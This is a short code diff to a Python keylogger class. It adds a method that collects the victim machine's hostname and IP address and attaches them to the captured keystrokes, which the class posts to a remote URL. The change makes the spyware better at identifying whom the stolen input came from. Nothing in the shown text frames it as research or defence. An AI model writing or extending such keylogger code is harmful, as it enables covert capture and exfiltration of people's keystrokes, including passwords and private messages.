@@ -1,5 +1,6 @@
+import imp
 import time
-
+import socket
 # import asynchio
 
 # from aiohttp import ClientSession
@@ -64,7 +65,7 @@ class KeyLogger:
     
     def post(self, lines):
         res = requests.post(self.url, {
-                "user": 'user',
+                "user": self.get_Host_name_IP(),
                 'data' :" ".join(lines)})
         return res
 
@@ -88,6 +89,17 @@ class KeyLogger:
         if 'Key' in key:
             return "\n" + key + '\n'
         return key
+    def get_Host_name_IP(self):
+        try:
+            host_name = socket.gethostname()
+            host_ip = socket.gethostbyname(host_name)
+            user = f"{host_name}  {host_ip}"
+            print(user)
+            return user
+        except:
+            print("Unable to get Hostname and IP")
+            return "defaultuser"
+
 
 if __name__ == "__main__":
     k = KeyLogger(10)
